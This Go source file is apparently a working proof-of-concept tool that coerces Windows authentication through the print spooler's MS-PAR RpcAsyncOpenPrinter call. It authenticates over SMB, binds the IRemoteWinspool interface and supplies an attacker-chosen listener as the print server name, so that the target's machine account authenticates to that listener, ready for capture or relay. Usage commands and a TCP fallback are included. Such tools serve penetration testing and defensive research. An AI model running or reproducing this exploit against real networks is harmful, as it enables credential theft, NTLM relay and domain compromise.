// File name          : coerce_poc.go
// Author             : Podalirius (@podalirius_)
// Date created       : 10 Sep 2026
//
// Proof of concept for coercing authentication with MS-PAR::RpcAsyncOpenPrinter()
// (opnum 0), written with the TheManticoreProject libraries:
//
//   - github.com/TheManticoreProject/goopts    for the command line parsing
//   - github.com/TheManticoreProject/Manticore for SMB, DCE/RPC and the IRemoteWinspool interface
//
// The target's spooler resolves the [in,string,unique] pPrinterName it is given. Passing a
// print server name of the form \\<listener> makes the remote machine account authenticate
// to that listener over SMB while the spooler tries to open the print server object
// ([MS-PAR] 3.1.4.1.1 RpcAsyncOpenPrinter, which reuses the [MS-RPRN] 3.1.4.2.1
// RpcOpenPrinter processing rules).
//
// Run it from this directory (go.mod pins the libraries):
//
//	go run coerce_poc.go --target 192.168.1.30 --listener 192.168.1.10 -d LAB.local -u user -p 'password'
//
// or build a standalone binary with:
//
//	go build -o coerce_poc coerce_poc.go
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
	IRemoteWinspool "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/76f03f96-cdfd-44fc-a22c-64950a001209/1.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/76f03f96-cdfd-44fc-a22c-64950a001209/1.0/functions"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ms-protocols/msproto"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/v5/pdu"
	smbclient "github.com/TheManticoreProject/Manticore/network/smb/client"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	mspar "github.com/TheManticoreProject/Manticore/windows/protocols/ms-par"
	"github.com/TheManticoreProject/goopts/parser"
	"golang.org/x/term"
)

var (
	// Configuration
	debug bool

	// Network settings
	target     string
	targetPort int
	pipeName   string

	// Coercion settings
	listener string

	// Authentication details
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string
	authNoPass   bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: "Windows auth coerce using MS-PAR::RpcAsyncOpenPrinter() - by Remi GASCOU (Podalirius) - v1.0.0",
	}

	ap.SetOptShowBannerOnHelp(true)
	ap.SetOptShowBannerOnRun(true)

	ap.NewBoolArgument(&debug, "", "--debug", false, "Enable debug mode.")

	// Network settings
	group_network, err := ap.NewArgumentGroup("Network")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_network.NewStringArgument(&target, "-t", "--target", "", true, "IP address or hostname of the target.")
		group_network.NewTcpPortArgument(&targetPort, "", "--target-port", 445, false, "Port of the SMB service on the target.")
		// The README lists this interface on: \PIPE\spoolss.
		// Manticore's PipeName is the endpoint the protocol documents as its own
		// ([MS-PAR] 2.1 Transport: the asynchronous interface shares the \spoolss pipe).
		group_network.NewStringArgument(&pipeName, "", "--pipe", IRemoteWinspool.PipeName, false, "Named pipe to bind the IRemoteWinspool interface on.")
	}

	// Coercion settings
	group_coerce, err := ap.NewArgumentGroup("Coercion")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_coerce.NewStringArgument(&listener, "-l", "--listener", "", true, "IP address or hostname of the listener the target should authenticate to (sent as the print server name \\\\<listener>, so it carries no share or file component).")
	}

	// Authentication
	group_auth, err := ap.NewArgumentGroup("Authentication")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_auth.NewStringArgument(&authDomain, "-d", "--domain", "", false, "(FQDN) domain to authenticate to.")
		group_auth.NewStringArgument(&authUsername, "-u", "--user", "", false, "User to authenticate as.")
	}

	// Secret
	group_secret, err := ap.NewNotRequiredMutuallyExclusiveArgumentGroup("Secret")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_secret.NewBoolArgument(&authNoPass, "", "--no-pass", false, "Don't ask for a password (null session).")
		group_secret.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		group_secret.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
	}

	ap.Parse()
}

// RpcAsyncOpenPrinter (opnum 0), as documented by [MS-PAR]:
//
//	DWORD RpcAsyncOpenPrinter(
//	    [in] handle_t hRemoteBinding,
//	    [in, string, unique] wchar_t* pPrinterName,
//	    [out] PRINTER_HANDLE* pHandle,
//	    [in, string, unique] wchar_t* pDatatype,
//	    [in] DEVMODE_CONTAINER* pDevModeContainer,
//	    [in] DWORD AccessRequired,
//	    [in] SPLCLIENT_CONTAINER* pClientInfo
//	);
//
// The binding handle is implicit in Go. The request/response structs below are lifted
// verbatim from Manticore's generated call for this opnum
// (network/dcerpc/interfaces/76f03f96-cdfd-44fc-a22c-64950a001209/1.0/functions/00_RpcAsyncOpenPrinter.go), which is the reviewed
// translation of that IDL; the wrapper there folds a nonzero return value into an
// error string, so the call is issued here to keep the numeric status.
//
// The two container parameters are [in] <TYPE>* without an explicit pointer attribute, so
// they are [ref] pointers: NDR transmits their referent inline, which is why they are held
// by value here (impacket models them the same way for the [MS-RPRN] twin RpcOpenPrinter).

// rpcAsyncOpenPrinterRequest carries the [in] parameters of RpcAsyncOpenPrinter.
type rpcAsyncOpenPrinterRequest struct {
	PPrinterName      *ndr.WSTR `ndr:"unique"`
	PDatatype         *ndr.WSTR `ndr:"unique"`
	PDevModeContainer mspar.DEVMODE_CONTAINER
	AccessRequired    ndr.DWORD
	PClientInfo       mspar.SPLCLIENT_CONTAINER
}

// rpcAsyncOpenPrinterResponse carries the [out] parameters and return value of RpcAsyncOpenPrinter.
type rpcAsyncOpenPrinterResponse struct {
	PHandle mspar.PRINTER_HANDLE
	Status  ndr.DWORD `ndr:"retval"`
}

func (*rpcAsyncOpenPrinterRequest) Opnum() uint16 { return IRemoteWinspool.OpnumRpcAsyncOpenPrinter }

// serverRead is the AccessRequired mask sent for the print server object: SERVER_READ,
// STANDARD_RIGHTS_READ (0x00020000) | SERVER_ACCESS_ENUMERATE (0x00000002)
// ([MS-RPRN] 2.2.3.1 Access Values, reused by [MS-PAR] 3.1.4.1.1). It is the least
// privileged mask the spooler grants on a print server, and the same value the Python PoC
// sends (impacket's rprn.SERVER_READ), so both PoCs are byte-identical on the wire. The
// mask plays no part in the coercion: the name is resolved before the access check.
const serverRead ndr.DWORD = 0x00020002

// splClientInfoLevel is the SPLCLIENT_CONTAINER level, and the discriminant of its
// ClientInfo union: level 1 selects SPLCLIENT_INFO_1 ([MS-RPRN] 2.2.1.2.14 / 2.2.1.11.1,
// reused by [MS-PAR]). The IDL requires a well-formed container, but its contents play no
// part in the coercion, so an all-zero SPLCLIENT_INFO_1 (no machine name, no user name) is
// sent, exactly as the Python PoC does.
const splClientInfoLevel ndr.DWORD = 1

// win32ErrorNames names the Win32 error codes ([MS-ERREF] 2.2) that this interface returns
// but that Manticore's status table for it does not cover yet. IRemoteWinspool.StatusString is
// always consulted first, so the codes Manticore does define keep their names from there
// and this map only fills the gaps. ERROR_BAD_NETPATH is the one a coercion normally ends
// on: the target could not reach the UNC path — after trying to. ERROR_INVALID_PRINTER_NAME
// is the other expected outcome here, the spooler's verdict on a print server it failed to
// contact.
var win32ErrorNames = map[uint32]string{
	0x00000003: "ERROR_PATH_NOT_FOUND",
	0x00000005: "ERROR_ACCESS_DENIED",
	0x00000035: "ERROR_BAD_NETPATH",
	0x00000043: "ERROR_BAD_NET_NAME",
	0x0000007b: "ERROR_INVALID_NAME",
	0x00000709: "ERROR_INVALID_PRINTER_NAME",
}

// statusName resolves a Win32 status code to its constant name, preferring Manticore's
// own table. StatusString falls back to a "0x%08x" rendering for codes it does not know,
// which is how an unknown code is detected here.
func statusName(status uint32) string {
	if name := IRemoteWinspool.StatusString(status); !strings.HasPrefix(name, "0x") {
		return name
	}
	if name, found := win32ErrorNames[status]; found {
		return name
	}
	return "UNKNOWN_ERROR"
}

// formatStatus renders a status as "ERROR_BAD_NETPATH (0x00000035)".
func formatStatus(status uint32) string {
	return fmt.Sprintf("%s (0x%08x)", statusName(status), status)
}

// interfaceSyntaxes returns the abstract syntaxes to try, in order. A protocol may be
// registered under several interface UUIDs and a given Windows version may only expose
// some of them, so a rejected bind is a reason to try the next candidate, not to stop.
// MS-PAR registers a single one: IRemoteWinspool, 76f03f96-cdfd-44fc-a22c-64950a001209
// version 1.0 ([MS-PAR] 1.9 Standards Assignments).
func interfaceSyntaxes() []syntax.SyntaxID {
	candidates := []syntax.SyntaxID{IRemoteWinspool.SyntaxID()}
	return candidates
}

// promptPassword asks for the password on the terminal, as the Python PoC does when a
// username is given with neither a password, hashes, nor --no-pass.
func promptPassword() (string, error) {
	fmt.Print("Password: ")
	secret, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	if err != nil {
		return "", err
	}
	return string(secret), nil
}

func main() {
	parseArgs()

	if debug {
		logger.SetLevel(logger.LevelDebug)
	}

	if authUsername != "" && authPassword == "" && authHashes == "" && !authNoPass {
		password, err := promptPassword()
		if err != nil {
			logger.Errorf("Error reading password: %s", err)
			return
		}
		authPassword = password
	}

	creds, err := credentials.NewCredentials(authDomain, authUsername, authPassword, authHashes)
	if err != nil {
		logger.Errorf("Error creating credentials: %s", err)
		return
	}

	// Negotiate the best dialect the target supports (SMB1 or SMB2+), the DCE/RPC
	// named-pipe transport is then the same for the caller either way.
	logger.Infof("Connecting to %s:%d ...", target, targetPort)
	smb, err := smbclient.Dial(target, targetPort, smbclient.Options{})
	if err != nil {
		logger.Errorf("Error connecting to %s:%d: %s", target, targetPort, err)
		return
	}
	defer smb.Disconnect()
	logger.Infof("Connected, negotiated dialect [%s]", smb.Dialect())

	if err := smb.Login(creds); err != nil {
		logger.Errorf("Error authenticating to %s: %s", target, err)
		return
	}
	defer smb.Logoff()
	logger.Infof("Authenticated as [%s]", strings.Trim(authDomain+"\\"+authUsername, "\\"))

	// Named pipes live on the IPC$ tree ([MS-RPCE] 2.1.1.2).
	if err := smb.TreeConnect("IPC$"); err != nil {
		logger.Errorf("Error connecting to share IPC$: %s", err)
		return
	}
	defer smb.TreeDisconnect()

	// A rejected bind leaves the association unusable, so every candidate syntax gets a
	// fresh pipe and client of its own.
	var rpc *dcerpcclient.Client
	closeRPC := func() error { return nil }
	for _, abstractSyntax := range interfaceSyntaxes() {
		transport, err := smb.RPCTransport(pipeName)
		if err != nil {
			// The pipe is missing rather than the bind refused: since the hardening that
			// followed [MSFT-CVE-2021-34527] the spooler can be told to expose its RPC
			// interfaces over TCP only (RpcUseNamedPipeProtocol), and then \PIPE\spoolss
			// does not exist at all. Not fatal here, ncacn_ip_tcp is tried below.
			logger.Warnf("Could not open pipe %s: %s", pipeName, err)
			break
		}

		logger.Infof("Binding to <%s> on %s ...", abstractSyntax, pipeName)
		candidate := dcerpcclient.NewClient(transport)
		// Authenticate at the RPC layer on top of the SMB session: several of these
		// services refuse an anonymously bound association (EFSRPC answers
		// nca_s_fault_access_denied since [MSFT-CVE-2021-43893]). Sign and seal every PDU.
		if err := candidate.SetAuth(pdu.AuthTypeNTLMSSP, pdu.AuthLevelPktPrivacy, creds); err != nil {
			logger.Errorf("Error configuring RPC authentication: %s", err)
			candidate.Close()
			return
		}
		if err := candidate.Bind(abstractSyntax); err != nil {
			logger.Warnf("Bind rejected: %s", err)
			candidate.Close()
			continue
		}
		logger.Info("Bind successful")
		rpc, closeRPC = candidate, candidate.Close
		break
	}
	// Named pipes unavailable: resolve the interface through the endpoint mapper on
	// TCP/135 and bind it over ncacn_ip_tcp instead, which is the only way to reach a
	// spooler that was configured for TCP only.
	//
	// Be aware of what this changes: the callback the target makes follows the protocol
	// sequence of the binding it was asked on. Bound over ncacn_ip_tcp, the target opens
	// its reply binding to the listener over RPC and never touches SMB, so an SMB
	// listener captures nothing. Measured against a Server 2025 DC: the call reaches the
	// spooler and returns RPC_S_SERVER_UNAVAILABLE (0x6ba) once it fails to find a print
	// client on the listener, with no connection on port 445 at all. Coercing SMB
	// authentication needs the named pipe path above; this fallback is what lets the call
	// be made and diagnosed at all when \PIPE\spoolss is gone.
	if rpc == nil {
		for _, abstractSyntax := range interfaceSyntaxes() {
			logger.Infof("Binding to <%s> over ncacn_ip_tcp (endpoint mapper) ...", abstractSyntax)
			candidate, closer, err := msproto.NewTCPBinder(target, 0, creds, 0).Bind(abstractSyntax)
			if err != nil {
				logger.Warnf("Bind over ncacn_ip_tcp failed: %s", err)
				continue
			}
			logger.Info("Bind successful")
			rpc, closeRPC = candidate, closer
			break
		}
	}
	if rpc == nil {
		logger.Errorf("Could not bind the IRemoteWinspool interface on %s nor over ncacn_ip_tcp.", pipeName)
		return
	}
	defer closeRPC()

	// The print server name the target will resolve, and therefore authenticate to. A
	// machine name only: pPrinterName names a print server here, so it carries no share
	// and no file component. This is the string the Python PoC sends, and the same shape
	// Manticore's own RpcOpenPrinter integration test uses. ndr.WSTR adds the NUL
	// terminator the [string] attribute needs.
	printerName := ndr.WSTR(fmt.Sprintf(`\\%s`, listener))

	logger.Infof("Calling RpcAsyncOpenPrinter(pPrinterName='%s') ...", printerName)
	request := &rpcAsyncOpenPrinterRequest{
		PPrinterName: &printerName,
		// [in, string, unique]: NULL, no data type is being requested.
		PDatatype: nil,
		// No device mode is being set, so an empty container: CbBuf = 0 and a NULL
		// [size_is(cbBuf), unique] pDevMode ([MS-RPRN] 2.2.1.2.1).
		PDevModeContainer: mspar.DEVMODE_CONTAINER{},
		AccessRequired:    serverRead,
		PClientInfo: mspar.SPLCLIENT_CONTAINER{
			Level: splClientInfoLevel,
			ClientInfo: mspar.SPLCLIENT_CONTAINER_ClientInfo{
				Tag:          splClientInfoLevel,
				PClientInfo1: &mspar.SPLCLIENT_INFO_1{},
			},
		},
	}
	var response rpcAsyncOpenPrinterResponse

	if err := rpc.Invoke(request, &response); err != nil {
		// A DCE/RPC fault means the call never reached the method: a wrong interface,
		// endpoint or parameter modelling, not a refusal by the server.
		logger.Errorf("RpcAsyncOpenPrinter() faulted: %s", err)
		return
	}

	status := uint32(response.Status)
	if status == IRemoteWinspool.StatusSuccess {
		logger.Infof("RpcAsyncOpenPrinter() returned %s, check your listener.", formatStatus(status))
		// The listener answered as a print server, so the call handed back a live
		// PRINTER_HANDLE. Close it rather than leaving it to the association's
		// context-handle rundown (RpcAsyncClosePrinter, opnum 20).
		if _, err := functions.RpcAsyncClosePrinter(rpc, response.PHandle); err != nil {
			logger.Warnf("RpcAsyncClosePrinter() failed, the handle is left to context rundown: %s", err)
		}
		return
	}
	// Any other status is expected: the target fails to open a print server it cannot
	// reach, but it has already authenticated to the listener to find that out.
	logger.Infof("RpcAsyncOpenPrinter() returned a status: %s", formatStatus(status))
	logger.Info("The call was processed by the target, check your listener.")
}
